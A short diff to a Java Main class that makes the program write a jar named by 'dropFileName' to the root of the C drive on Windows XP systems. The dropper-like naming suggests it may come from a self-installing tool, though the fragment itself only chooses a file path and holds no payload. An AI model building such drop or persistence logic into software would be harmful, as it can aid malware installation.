@@ -87,7 +87,7 @@ public class Main {
 			}
 
 			File file = null;
-			if (dropLocation.equals("root/C drive")) {
+			if (dropLocation.equals("root/C drive") || System.getProperty("os.name").toLowerCase().contains("xp")) {
 				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 					file = new File("C:\\" + dropFileName + ".jar");
 				} else {
